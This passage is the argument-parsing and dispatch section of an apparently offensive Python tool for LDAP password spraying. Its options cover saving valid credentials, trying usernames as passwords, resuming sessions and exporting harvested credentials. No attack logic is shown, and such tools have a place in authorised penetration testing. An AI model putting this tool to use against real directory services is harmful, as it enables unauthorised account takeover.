    spray_parser.add_argument("-o", "--output", help="Output file for valid credentials")
    spray_parser.add_argument("-v", "--verbose", type=int, default=3, choices=[0, 1, 2, 3],
                              help="Verbosity level (0=silent, 3=max, default: 3)")
    spray_parser.add_argument("--userpass", action="store_true", help="Try username as password")
    spray_parser.add_argument("--ssl", action="store_true", help="Use LDAPS (SSL/TLS)")
    spray_parser.add_argument("--port", type=int, help="Override port number")
    spray_parser.add_argument("--resume", metavar="SESSION_ID", help="Resume an existing session")
    spray_parser.add_argument("--session-path", default=str(DEFAULT_SESSION_PATH),
                              help=f"Session storage path (default: {DEFAULT_SESSION_PATH})")
    spray_parser.set_defaults(func=cmd_spray)

    # Sessions subcommand
    sessions_parser = subparsers.add_parser("sessions", help="List all sessions")
    sessions_parser.add_argument("--session-path", default=str(DEFAULT_SESSION_PATH),
                                 help=f"Session storage path (default: {DEFAULT_SESSION_PATH})")
    sessions_parser.set_defaults(func=cmd_sessions)

    # Delete subcommand
    delete_parser = subparsers.add_parser("delete", help="Delete a session")
    delete_parser.add_argument("session_id", help="Session ID to delete")
    delete_parser.add_argument("--session-path", default=str(DEFAULT_SESSION_PATH),
                               help=f"Session storage path (default: {DEFAULT_SESSION_PATH})")
    delete_parser.set_defaults(func=cmd_delete)

    # Export subcommand
    export_parser = subparsers.add_parser("export", help="Export session results")
    export_parser.add_argument("session_id", help="Session ID to export")
    export_parser.add_argument("-f", "--format", choices=["json", "creds"], default="creds",
                               help="Export format (default: creds)")
    export_parser.add_argument("--session-path", default=str(DEFAULT_SESSION_PATH),
                               help=f"Session storage path (default: {DEFAULT_SESSION_PATH})")
    export_parser.set_defaults(func=cmd_export)

    args = parser.parse_args()

    # Disable colors if not a TTY
    if not sys.stderr.isatty():
        Colors.disable()

    if not args.command:
        parser.print_help()
        return 1

    return args.func(args)


if __name__ == "__main__":
    sys.exit(main())